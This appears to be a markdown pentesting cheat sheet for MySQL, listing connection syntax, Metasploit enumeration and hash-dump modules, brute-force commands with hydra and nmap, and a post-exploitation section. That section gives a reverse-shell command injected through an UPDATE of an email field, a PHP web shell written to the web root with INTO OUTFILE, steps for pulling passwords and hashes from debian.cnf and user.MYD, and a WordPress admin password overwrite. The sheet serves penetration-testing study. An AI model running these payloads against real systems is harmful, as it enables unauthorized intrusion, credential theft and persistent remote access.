```markdown
# MySQL Pentesting Commands

**Default Port:** 3306

**Version:** If MySQL server 4.x/5.x and root database user creds found, try User Defined Functions (Multiple Methods) to escalate privs https://steflan-security.com/linux-privilege-escalation-exploiting-user-defined-functions/

## Connection
```bash
mysql -u <username> #specified username #no password
```

```bash
mysql -u <username> -p #with password
```

```bash
mysql -u <username> -p <database_name> #specified database
```

**Remote**
```bash
mysql -u <username> -h <hostname> -P <port> -p #specified hostname #specified port
```

```bash
mysql -u <username> -h <hostname> -P <port> -p -D <database_name> #specified database (-D)
```

**URL**  
The MySQL connection URL is a line containing all the information necessary for an application to connect to a MySQL database. A typical format is as follows:
```bash
mysql://<username>:<password>@<hostname>:<port>/<database_name>
```

## Enumeration

**Identifying an MySQL Server**

**Assessment with Metasploit**
```bash
msf> use auxiliary/scanner/mysql/mysql_version #version detection
msf> use auxiliary/scanner/mysql/mysql_authbypass_hashdump #auth bypass dump
msf> use auxiliary/scanner/mysql/mysql_hashdump #password hashes
msf> use auxiliary/admin/mysql/mysql_enum #user enumeration
msf> use auxiliary/scanner/mysql/mysql_schemadump #schema dumping
msf> use exploit/windows/mysql/mysql_start_up #command execution
```

**Banner Grabbing**
```bash
nc -nv X.X.X.X 3306
```

## Attack Vectors

**Default Credentials**  
To test a default account, you might execute:  
If anonymous login is disabled on the MySQL server,  
trying common usernames and passwords like admin, administrator , root , user, or test.

**Bruteforcing Credentials**
```bash
hydra [-L users.txt or -l user_name] [-P pass.txt or -p password] -f [-S port] mysql://X.X.X.X
```

**Bruteforcing with Nmap**
```bash
nmap -p 3306 --script mysql-brute X.X.X.X
```

**Bruteforcing with Metasploit**
```bash
use auxiliary/scanner/mysql/mysql_login
msf auxiliary(scanner/mysql/mysql_login) > set rhosts X.X.X.X
msf auxiliary(scanner/mysql/mysql_login) > set user_file /path/to/user.txt
msf auxiliary(scanner/mysql/mysql_login) > set pass_file /path/to/pass.txt
msf auxiliary(scanner/mysql/mysql_login) > set stop_on_success true
msf auxiliary(scanner/mysql/mysql_login) > exploit
```

## Post-Exploitation

**Common MySQL Commands**  
This table provides a clear overview of each command's function within MySQL and how they are used, covering a broad spectrum of database management tasks.

| Command                  | Description                                      | Usage                                              |
|--------------------------|--------------------------------------------------|----------------------------------------------------|
| SHOW DATABASES;          | Lists all databases on the MySQL server.         | SHOW DATABASES;                                    |
| USE                      | Switches to a specific database.                 | USE database_name;                                 |
| SHOW TABLES;             | Displays all tables in the current database.     | SHOW TABLES;                                       |
| SHOW COLUMNS FROM        | Lists all columns in a specific table.           | SHOW COLUMNS FROM table_name;                      |
| SELECT                   | Retrieves data from a table.                     | SELECT * FROM table_name;                          |
| INSERT INTO              | Inserts a new record into a table.               | INSERT INTO table_name (column1, column2) VALUES (value1, value2); |
| UPDATE                   | Updates records in a table that meet the condition. | UPDATE table_name SET column1 = value1 WHERE condition; |
| DELETE FROM              | Deletes records from a table that meet the condition. | DELETE FROM table_name WHERE condition;            |
| CREATE DATABASE          | Creates a new database.                          | CREATE DATABASE database_name;                     |
| DROP DATABASE            | Deletes a database.                              | DROP DATABASE database_name;                       |
| CREATE TABLE             | Creates a new table.                             | CREATE TABLE table_name (column1 datatype, column2 datatype); |
| DROP TABLE               | Deletes a table.                                 | DROP TABLE table_name;                             |
| ALTER TABLE ADD          | Adds a new column to a table.                    | ALTER TABLE table_name ADD column_name datatype;   |
| ALTER TABLE DROP COLUMN  | Deletes a column from a table.                   | ALTER TABLE table_name DROP COLUMN column_name;    |
| GRANT                    | Grants privileges to a user on a database.       | GRANT ALL PRIVILEGES ON database_name.* TO 'user'@'localhost' IDENTIFIED BY 'password'; |
| REVOKE                   | Revokes privileges from a user on a database.    | REVOKE ALL PRIVILEGES ON database_name.* FROM 'user'@'localhost'; |
| SHOW GRANTS FOR          | Displays all privileges for a user.              | SHOW GRANTS FOR 'user'@'localhost';                |
| FLUSH PRIVILEGES;        | Reloads the grant tables in the database, making privilege changes effective immediately. | FLUSH PRIVILEGES;                                  |

**Executing a Reverse Shell Through SQL Command Injection**  
Example demonstrates updating a user's email in a database to execute a reverse shell
```bash
mysql> UPDATE hackviserdb.users SET email='hackviser@shell|| bash -c "bash -i >& /dev/tcp/<ip_address>/<port> 0>&1" &' WHERE name LIKE 'user%';
```

**Executing Commands via SQL Read & Write Operations**
```bash
SELECT load_file('/var/lib/mysql-files/key.txt');
```

**Writing Files:** SQL also enables writing data to files using the INTO OUTFILE clause.
```bash
SELECT 1,2,"<?php echo shell_exec($_GET['command']);?>",4,5 INTO OUTFILE '/var/www/html/shell.php'
```

**Accessing MySQL Credentials from System Files**  
MySQL credentials can be uncovered in plaintext or as hashes from specific system files, providing alternative access methods to the database:  
Debian System Maintenance User: The /etc/mysql/debian.cnf file contains the plaintext password for the debian-sys-maint user.  
MySQL User Hashes: User password hashes are stored in /var/lib/mysql/mysql/user.MYD. These hashes represent the encrypted passwords of MySQL users and can be extracted for potential cracking.
```bash
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
```

**Overwriting wordpress password in wordpress database**
```bash
UPDATE wp_users SET user_pass=MD5('robert') WHERE user_login = 'admin'; #Updating using admin passsword to "robert" using md5 encryption
UPDATE `wp_users` SET `user_pass` = "$P$BxA3ZFHi3G.ccutvJTqbuSZilRhfqP0" WHERE user_email="your_email_adress" #Updating the password using PHPass encryption. Encrupted pass is "robert"
```
```
